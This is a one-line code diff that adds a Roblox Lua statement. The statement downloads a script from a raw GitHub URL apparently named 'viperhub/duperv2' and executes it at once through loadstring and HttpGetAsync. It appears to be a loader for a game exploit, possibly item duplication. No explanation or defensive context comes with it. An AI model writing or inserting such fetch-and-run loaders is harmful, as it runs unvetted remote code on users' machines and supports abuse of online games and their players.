@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/0ksy1/viperhub/refs/heads/main/duperv2"))()
